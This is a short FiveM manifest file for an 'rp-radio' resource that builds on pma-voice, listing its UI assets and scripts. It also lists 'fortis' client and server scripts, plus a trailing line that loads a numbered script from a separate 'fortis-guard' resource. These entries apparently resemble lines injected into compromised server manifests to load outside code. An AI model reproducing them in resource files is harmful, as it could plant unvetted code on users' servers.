fx_version "adamant"
game "gta5"

name "rp-radio"
description "An in-game radio which makes use of the pma-voice radio API for FiveM"
author "Frazzle (frazzle9999@gmail.com)"
version "2.2.1"

ui_page "html/index.html"

dependencies {
	"pma-voice",
}

files {
	"html/index.html",
	"html/on.ogg",
	"html/off.ogg",
	"html/app.css",
	"html/radio.png",
	"html/js/app.js"
}

client_scripts {
	"config.lua",
	"client/client.lua",
	"client/fortis-client.lua",
}

server_scripts {
	"server/fortis-server.lua",
}
client_script '@fortis-guard/03923.lua'